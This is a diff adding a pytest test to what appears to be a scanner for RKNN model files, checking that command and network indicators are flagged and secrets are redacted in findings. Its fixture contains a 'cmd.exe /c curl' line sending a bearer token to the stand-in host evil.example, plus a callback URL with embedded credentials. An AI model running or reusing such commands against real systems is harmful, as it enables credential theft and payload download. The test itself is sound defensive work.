@@ -64,6 +64,40 @@ def test_scan_detects_correlated_command_and_network_indicators(tmp_path: Path) 
     assert correlated[0].severity == IssueSeverity.CRITICAL
 
 
+def test_rknn_redacts_sensitive_evidence_in_findings(tmp_path: Path) -> None:
+    payload = (
+        b"RKNN\x01\x00\x00\x00"
+        b"callback=https://user:secretpass@evil.example/collect?access_token=tok_12345\n"
+        b'notes=cmd.exe /c curl -H "Authorization: Bearer sk-testsecret1234567890" '
+        b"https://evil.example/payload?api_key=key_12345\n"
+    )
+    path = _write_rknn_file(tmp_path, payload, filename="redacted.rknn")
+
+    result = RknnScanner().scan(str(path))
+
+    path_reference = [
+        check
+        for check in result.checks
+        if check.name == "RKNN Path Reference Validation" and check.status == CheckStatus.FAILED
+    ]
+    correlated = [
+        check
+        for check in result.checks
+        if check.name == "RKNN Command and Network Indicator Correlation" and check.status == CheckStatus.FAILED
+    ]
+    assert len(path_reference) == 1
+    assert len(correlated) == 1
+
+    details = repr(path_reference[0].details) + repr(correlated[0].details)
+    assert "secretpass" not in details
+    assert "tok_12345" not in details
+    assert "sk-testsecret" not in details
+    assert "key_12345" not in details
+    assert "evil.example" in details
+    assert "curl" in details
+    assert "<redacted>" in details
+
+
 def test_scan_handles_truncated_rknn_gracefully(tmp_path: Path) -> None:
     path = _write_rknn_file(tmp_path, b"RKNN", filename="truncated.rknn")
 
